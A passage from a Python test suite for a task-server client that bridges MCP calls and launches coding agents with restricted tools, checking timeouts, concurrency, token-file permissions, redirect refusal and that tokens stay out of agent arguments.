        (urllib.error.URLError(ConnectionResetError(errno.ECONNRESET, "Connection reset by peer")), False),
        (urllib.error.URLError(socket.gaierror(8, "nodename nor servname provided")), False),
        (urllib.error.URLError(ssl.SSLError(1, "certificate verify failed")), False),
        (urllib.error.URLError("unknown url type"), False),
        (urllib.error.HTTPError("https://x.lemoncrow.com", 502, "Bad Gateway", None, None), False),  # type: ignore[arg-type]
        (TimeoutError("timed out"), False),  # the request was sent; its reply timed out
        (http.client.RemoteDisconnected("closed"), False),
    ],
)
def test_only_a_connection_the_server_did_not_take_wakes_it(exc: BaseException, unreachable: bool) -> None:
    assert task_server._unreachable(exc) is unreachable


def test_a_hosted_server_that_does_not_take_the_connection_is_given_up_on_promptly(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    seen: list[tuple[str, object]] = []

    class Sock:
        def settimeout(self, value: object) -> None:
            seen.append(("read", value))

    def connect(self: http.client.HTTPSConnection) -> None:
        seen.append(("connect", self.timeout))
        self.sock = Sock()

    monkeypatch.setattr(http.client.HTTPSConnection, "connect", connect)
    connection = task_server._PromptHTTPSConnection("acme.workspaces.lemoncrow.com", timeout=300.0)
    connection.connect()
    assert seen == [("connect", 10.0), ("read", 300.0)] and connection.timeout == 300.0
    seen.clear()
    task_server._PromptHTTPSConnection("acme.workspaces.lemoncrow.com", timeout=5.0).connect()
    assert seen == [("connect", 5.0)]

    def prompt(client: WorkspacesClient) -> bool:
        return any(isinstance(handler, task_server._PromptHTTPSHandler) for handler in client._opener.handlers)

    assert prompt(WorkspacesClient("https://acme.workspaces.lemoncrow.com"))
    assert not prompt(WorkspacesClient("https://10.0.0.5:7480"))


def _bridged(fake: FakeState, lines: Sequence[bytes], **options: Any) -> list[dict[str, Any]]:
    record = load_record(fake.base, "t1")
    assert record is not None
    sink = io.StringIO()
    source = io.BytesIO(b"".join(line + b"\n" for line in lines))
    assert bridge(source, sink, client=WorkspacesClient(fake.base), record=record, log=io.StringIO(), **options) == 0
    return [json.loads(line) for line in sink.getvalue().splitlines()]


def test_two_slow_calls_overlap_and_each_reply_keeps_its_id(fake: FakeState) -> None:
    assert start(fake)[0] == 0
    fake.barrier = threading.Barrier(2, timeout=10)  # neither call is answered until both are in flight
    replies = _bridged(
        fake,
        [
            b'{"jsonrpc":"2.0","id":"a","method":"slow","params":{"delay":0.3}}',
            b'{"jsonrpc":"2.0","id":2,"method":"slow","params":{"delay":0}}',
        ],
    )

    assert [reply["id"] for reply in replies] == [2, "a"]  # the quicker call is answered first
    assert {reply["id"]: reply["result"]["params"]["delay"] for reply in replies} == {"a": 0.3, 2: 0}
    assert fake.peak == 2


def test_a_cancellation_does_not_wait_behind_the_call_it_cancels(fake: FakeState) -> None:
    assert start(fake)[0] == 0
    replies = _bridged(
        fake,
        [
            b'{"jsonrpc":"2.0","id":1,"method":"wait_cancel"}',
            b'{"jsonrpc":"2.0","method":"notifications/cancelled","params":{"requestId":1}}',
        ],
    )
    assert replies == [{"jsonrpc": "2.0", "id": 1, "result": {"echo": "wait_cancel", "cancelled": True}}]


def test_the_bridge_bounds_calls_in_flight_and_initialize_waits_for_them(fake: FakeState) -> None:
    assert start(fake)[0] == 0
    slow = b'{"jsonrpc":"2.0","id":%d,"method":"slow","params":{"delay":0.2}}'
    replies = _bridged(
        fake,
        [slow % 1, slow % 2, slow % 3, b'{"jsonrpc":"2.0","id":4,"method":"initialize"}', slow % 5],
        workers=2,
    )

    assert sorted(reply["id"] for reply in replies) == [1, 2, 3, 4, 5]
    assert fake.peak == 2
    events = fake.events
    initialize = events.index(("arrive", 4))
    assert all(events.index(("leave", earlier)) < initialize for earlier in (1, 2, 3))
    assert events.index(("leave", 4)) < events.index(("arrive", 5))


def test_mcp_without_a_token_file_reports_on_stderr_only(
    fake: FakeState, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    _stdin(monkeypatch, [])
    code, output = run("mcp", "t9", "--server", fake.base)
    assert code == 1 and output == ""
    assert "no task token for t9" in capsys.readouterr().err


def test_a_token_file_others_can_read_is_refused(fake: FakeState) -> None:
    assert start(fake)[0] == 0
    record_path(fake.base, "t1").chmod(0o644)
    code, output = run("verify", "t1", "--server", fake.base)
    assert code == 1 and "not an owner-only file" in output


def test_verify_land_discard_list_and_preview_use_the_task_token(fake: FakeState) -> None:
    assert start(fake)[0] == 0
    token = f"Bearer {fake.tokens['t1']}"

    code, output = run("verify", "t1", "--server", fake.base)
    assert code == 0 and "app: passed at bbbbbbbbbbbb, saved as refs/x" in output and "unit  passed  1.2s" in output
    code, output = run("land", "t1", "--server", fake.base, "-m", "--help is a fine message")
    assert code == 0 and "app: pushed cccccccccccc" in output
    assert fake.requests[-1][3] == {"message": "--help is a fine message"}
    code, output = run("land", "t1", "--server", fake.base, "--message=refuse")
    assert code == 1 and "not landed: checks failed" in output
    assert run("land", "t1", "--server", fake.base)[0] == 2
    code, output = run("preview", "t1", "web", "--server", fake.base)
    assert code == 0 and f"{fake.base}/p/one-time-web" in output
    code, output = run("discard", "t1", "--server", fake.base)
    assert code == 0 and "app: discarded refs/lemoncrow/saved/t1" in output
    assert {entry[2] for entry in fake.requests[1:]} == {token}
    code, output = run("list", "--server", fake.base)
    assert code == 0 and output.startswith("t1  running  app agent/t1  last used 2026-11-08 10:00:00Z\n"), output
    assert fake.requests[-1][2] == f"Bearer {ORG_TOKEN}"


def test_start_names_the_agent_and_land_prints_reviews_findings(fake: FakeState) -> None:
    code, output = start(fake, "t1", "--model", "claude-opus-4")
    assert code == 0, output
    assert fake.requests[-1][3] == {"id": "t1", "agent": {"model": "claude-opus-4"}}
    assert start(fake, "t2", "--model", "two words")[0] == 2
    assert start(fake, "t3", "--model", "x" * 201)[0] == 2
    code, output = run("land", "t1", "--server", fake.base, "-m", "review")
    assert code == 1
    lines = output.splitlines()
    assert lines[0] == "lc task: t1 not landed: app: Review did not pass it: fails on 1 P0"
    assert lines[1] == "  app: Review: fails on 1 P0"
    assert lines[2] == "    P0  check unit failed"
    assert lines[3] == "    P1 src/a.py:1  finding 0"
    assert lines[-1] == "    ... and 2 more" and len(lines) == 23


def test_server_errors_are_reported_without_a_token(fake: FakeState) -> None:
    assert start(fake)[0] == 0
    code, output = start(fake)
    assert code == 1 and output == "lc task: Workspaces server: task t1 exists (HTTP 409)\n"
    code, output = run("verify", "nope", "--server", fake.base)
    assert code == 1 and "no task nope (HTTP 404)" in output


def test_a_redirect_is_not_followed(fake: FakeState) -> None:
    fake.redirect_to = fake.base
    code, output = run("list", "--server", f"{fake.base}/moved")
    assert code == 1 and "redirect" in output and "HTTP 302" in output
    assert [entry[1] for entry in fake.requests] == ["/moved/v1/tasks"]


def test_an_mcp_endpoint_on_another_origin_is_refused(fake: FakeState) -> None:
    fake.mcp_url = "http://203.0.113.9:8080/v1/tasks/t1/mcp"
    code, output = start(fake)
    assert code == 1 and "MCP endpoint off" in output
    assert not record_path(fake.base, "t1").exists()


def test_a_reply_past_the_size_bound_is_refused(fake: FakeState, monkeypatch: pytest.MonkeyPatch) -> None:
    assert start(fake)[0] == 0
    size = len(json.dumps({"tasks": list(fake.tasks.values())}).encode())
    monkeypatch.setattr(task_server, "_MAX_RESPONSE_BYTES", size)
    assert run("list", "--server", fake.base)[0] == 0
    monkeypatch.setattr(task_server, "_MAX_RESPONSE_BYTES", size - 1)
    code, output = run("list", "--server", fake.base)
    assert code == 1 and f"more than {size - 1} bytes" in output


def test_finish_deletes_the_token_file(fake: FakeState) -> None:
    assert start(fake)[0] == 0
    path = record_path(fake.base, "t1")
    assert path.exists()
    code, output = run("finish", "t1", "--server", fake.base)
    assert code == 0, output
    assert not path.exists()
    assert "app: work kept as refs/lemoncrow/saved/t1 (dddddddddddd)" in output
    assert fake.requests[-1][:3] == ("POST", "/v1/tasks/t1/finish", f"Bearer {fake.tokens['t1']}")


@dataclass
class FakeHost:
    calls: list[tuple[str, ...]] = field(default_factory=list)

    def run(self, argv: Sequence[str], *, check: bool) -> subprocess.CompletedProcess[str]:
        self.calls.append(tuple(argv))
        return subprocess.CompletedProcess(list(argv), 0, "", "")


@pytest.fixture
def host(monkeypatch: pytest.MonkeyPatch) -> FakeHost:
    fake_host = FakeHost()
    monkeypatch.setattr(host_install, "_host_executable", lambda name: f"/usr/bin/{name}")
    monkeypatch.setattr(host_install, "_client_launcher", lambda: ("/opt/lc/bin/lemoncrow-runtime-client",))
    monkeypatch.setattr(host_install, "_run", fake_host.run)
    return fake_host


@pytest.mark.parametrize(
    ("agent", "remove", "add"),
    [
        (
            "claude",
            ("/usr/bin/claude", "mcp", "remove", "--scope", "user", "lc-task-t1"),
            ("/usr/bin/claude", "mcp", "add", "--scope", "user", "lc-task-t1", "--"),
        ),
        (
            "codex",
            ("/usr/bin/codex", "mcp", "remove", "lc-task-t1"),
            ("/usr/bin/codex", "mcp", "add", "lc-task-t1", "--"),
        ),
        ("opencode", None, ("/usr/bin/opencode", "mcp", "add", "lc-task-t1", "--global", "--")),
    ],
)
def test_host_registration_runs_the_attach_command_without_a_token(
    fake: FakeState,
    host: FakeHost,
    tmp_path: Path,
    agent: str,
    remove: tuple[str, ...] | None,
    add: tuple[str, ...],
) -> None:
    code, output = start(fake, "t1", "--host", agent)

    assert code == 0, output
    attach = ("/opt/lc/bin/lemoncrow-runtime-client", "task", "mcp", "t1", "--server", fake.base)
    home = ("-e" if agent == "claude" else "--env", f"LEMONCROW_HOME={tmp_path / 'home'}")
    assert host.calls == [*([remove] if remove else []), (*add[:-1], *home, "--", *attach)]
    token = fake.tokens["t1"]
    assert not any(token in part or ORG_TOKEN in part for call in host.calls for part in call)
    assert token not in output
    assert json.loads(record_path(fake.base, "t1").read_text())["host"] == agent

    host.calls.clear()
    code, output = run("finish", "t1", "--server", fake.base)
    assert code == 0, output
    assert host.calls == ([remove] if remove else [])
    if remove is None:
        assert "remove MCP server lc-task-t1 in its settings" in output
    assert not record_path(fake.base, "t1").exists()


def test_an_agent_attached_with_a_non_default_home_finds_its_task_token(
    fake: FakeState, host: FakeHost, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    home = tmp_path / "another home"
    monkeypatch.setenv("LEMONCROW_HOME", str(home))
    monkeypatch.setenv("SOMETHING_ELSE", "not carried")
    assert start(fake, "t1", "--host", "claude")[0] == 0
    registered = host.calls[-1]
    split = registered.index("--")
    flags, attach = registered[:split], registered[split + 1 :]
    assert flags[-2:] == ("-e", f"LEMONCROW_HOME={home}") and "-e" not in flags[:-2]  # only what the attach needs

    # The agent host starts the command elsewhere, with its own environment plus what was registered.
    source = Path(lemoncrow_client.__file__).resolve().parents[1]
    environment = {"PATH": os.environ.get("PATH", ""), "HOME": str(tmp_path / "agent"), "NO_PROXY": "*"}
    environment["PYTHONPATH"] = str(source)
    command = [sys.executable, "-m", "lemoncrow_client", *attach[1:]]
    request = b'{"jsonrpc":"2.0","id":1,"method":"tools/list"}\n'
    key, _, value = flags[-1].partition("=")
    attached = subprocess.run(
        command, input=request, env={**environment, key: value}, capture_output=True, timeout=60, cwd=tmp_path
    )
    assert json.loads(attached.stdout) == {"jsonrpc": "2.0", "id": 1, "result": {"echo": "tools/list"}}
    without = subprocess.run(command, input=request, env=environment, capture_output=True, timeout=60, cwd=tmp_path)
    assert without.returncode == 1 and b"no task token for t1" in without.stderr


def test_a_failed_registration_keeps_the_token_and_records_no_host(
    fake: FakeState, monkeypatch: pytest.MonkeyPatch, host: FakeHost
) -> None:
    def refuse(argv: Sequence[str], *, check: bool) -> subprocess.CompletedProcess[str]:
        if check:
            raise subprocess.CalledProcessError(1, list(argv), "", "already exists")
        return subprocess.CompletedProcess(list(argv), 0, "", "")

    monkeypatch.setattr(host_install, "_run", refuse)
    code, output = start(fake, "t1", "--host", "claude")
    assert code == 1 and "registering lc-task-t1 failed: already exists" in output
    assert "host" not in json.loads(record_path(fake.base, "t1").read_text())


def test_unknown_host_is_a_usage_error(fake: FakeState) -> None:
    code, output = start(fake, "t1", "--host", "vim")
    assert code == 2 and "--host is one of claude, codex, opencode" in output
    assert fake.requests == []


@dataclass
class Launched:
    """What ``lc task claude|codex`` ran, seen while it ran (its scratch directory goes when it returns)."""

    returncode: int = 0
    argv: list[str] = field(default_factory=list)
    cwd: Path | None = None
    entries: list[str] = field(default_factory=list)
    config: Any = None


@pytest.fixture
def launched(monkeypatch: pytest.MonkeyPatch, host: FakeHost) -> Launched:
    seen = Launched()

    def launch(argv: Sequence[str], *, cwd: Path, check: bool) -> subprocess.CompletedProcess[str]:
        seen.argv, seen.cwd = list(argv), Path(cwd)
        seen.entries = sorted(entry.name for entry in Path(cwd).iterdir())
        config = Path(cwd).parent / "mcp.json"
        seen.config = json.loads(config.read_text(encoding="utf-8")) if config.exists() else None
        return subprocess.CompletedProcess(list(argv), seen.returncode)

    monkeypatch.setattr(task_server.subprocess, "run", launch)
    return seen


def _bridge_command(fake: FakeState, task_id: str = "t1") -> list[str]:
    return ["/opt/lc/bin/lemoncrow-runtime-client", "task", "mcp", task_id, "--server", fake.base]


def test_lc_task_claude_runs_claude_code_with_the_tasks_tools_only(
    fake: FakeState, launched: Launched, host: FakeHost, tmp_path: Path
) -> None:
    launched.returncode = 3
    arguments = ("claude", "t1", "--server", fake.base, "--model", "claude-opus-4")
    code, output = run(*arguments, "--", "--resume", "--server", "elsewhere")

    assert code == 3, output  # Claude Code's own exit status
    assert [entry[:2] for entry in fake.requests] == [("POST", "/v1/tasks")]
    assert fake.requests[0][3] == {"id": "t1", "agent": {"host": "claude", "model": "claude-opus-4"}}
    assert host.calls == []  # nothing registered in Claude Code's own MCP settings
    assert "attach an agent" not in output and "lc task: claude on t1" in output
    argv = launched.argv
    assert argv[0] == "/usr/bin/claude" and "--strict-mcp-config" in argv
    assert argv[argv.index("--tools") + 1] == ""  # no Read, Edit, Bash ... on this machine
    allowed = argv[argv.index("--allowedTools") + 1].split(",")
    assert "mcp__lc__edit" in allowed and "mcp__lc__bash" in allowed and "mcp__lc__land" not in allowed
    assert argv[argv.index("--model") + 1] == "claude-opus-4"
    assert "t1" in argv[argv.index("--append-system-prompt") + 1]
    assert argv[-3:] == ["--resume", "--server", "elsewhere"]  # after --, untouched
    assert launched.cwd is not None and launched.cwd.name == "work" and launched.entries == []
    server = launched.config["mcpServers"]["lc"]
    assert [server["command"], *server["args"]] == _bridge_command(fake)
    assert server["env"] == {"LEMONCROW_HOME": str(tmp_path / "home")}
    secrets = (fake.tokens["t1"], ORG_TOKEN)
    assert not any(secret in part for secret in secrets for part in [*argv, json.dumps(launched.config)])
    assert not launched.cwd.parent.exists()  # the scratch directory goes with Claude Code

    # Again from this machine: the task it started, not a new one.
    launched.returncode = 0
    assert run("claude", "t1", "--server", fake.base)[0] == 0
    assert len(fake.requests) == 1 and "--model" not in launched.argv
    code, output = run("claude", "t1", "--server", fake.base, "--repos", "lib")
    assert code == 2 and "already started from this machine" in output


def test_lc_task_codex_runs_codex_read_only_with_its_shell_off(
    fake: FakeState, launched: Launched, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    import tomllib

    home = tmp_path / 'a "quoted" home\\'  # TOML strings carry it as it is
    monkeypatch.setenv("LEMONCROW_HOME", str(home))
    code, output = run("codex", "t1", "--server", fake.base, "--repos", "app")

    assert code == 0, output
    assert fake.requests[0][3] == {"id": "t1", "agent": {"host": "codex"}, "repos": ["app"]}
    argv = launched.argv
    assert argv[:2] == ["/usr/bin/codex", "-C"] and Path(argv[2]) == launched.cwd and launched.entries == []
    assert argv[argv.index("--sandbox") + 1] == "read-only"
    assert [argv[at + 1] for at, item in enumerate(argv) if item == "--disable"] == ["unified_exec", "shell_tool"]
    assert "--model" not in argv
    settings = tomllib.loads("\n".join(argv[at + 1] for at, item in enumerate(argv) if item == "-c"))
    lc = settings["mcp_servers"]["lc"]
    assert [lc["command"], *lc["args"]] == _bridge_command(fake)
    assert lc["env"] == {"LEMONCROW_HOME": str(home)}
    assert lc["enabled_tools"][-1] == "land" and "bash" in lc["enabled_tools"] and lc["disabled_tools"] == []
    assert lc["tool_timeout_sec"] >= 600  # land and bash run the task's checks before they answer
    assert "t1" in settings["developer_instructions"]
    assert not any(fake.tokens["t1"] in part or ORG_TOKEN in part for part in argv)


def test_lc_task_claude_without_the_host_or_the_task_runs_nothing(
    fake: FakeState, launched: Launched, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake.tasks["t1"] = {"id": "t1"}  # started elsewhere: this machine has no token for it
    code, output = run("claude", "t1", "--server", fake.base)
    assert code == 1 and "task t1 exists" in output and launched.argv == []
    monkeypatch.setattr(host_install, "_host_executable", lambda name: None)
    code, output = run("codex", "t2", "--server", fake.base)
    assert code == 1 and "codex is not on PATH" in output
    assert len(fake.requests) == 1 and launched.argv == []
    assert run("claude", "t1", "t2", "--server", fake.base)[0] == 2


def test_without_a_server_the_new_verbs_say_where_they_run_and_help_names_the_server() -> None:
    for verb in ("verify", "discard", "preview", "mcp", "claude", "codex"):
        code, output = run(verb, "t1")
        assert code == 2 and "Workspaces server" in output and "--server URL" in output
    code, output = run("--help")
    assert code == 0 and "Workspaces server" in output and "lc task mcp ID --server URL" in output
    assert "lc task claude ID --server URL" in output and "lc task codex ID --server URL" in output
    assert run("land", "--server")[0] == 2
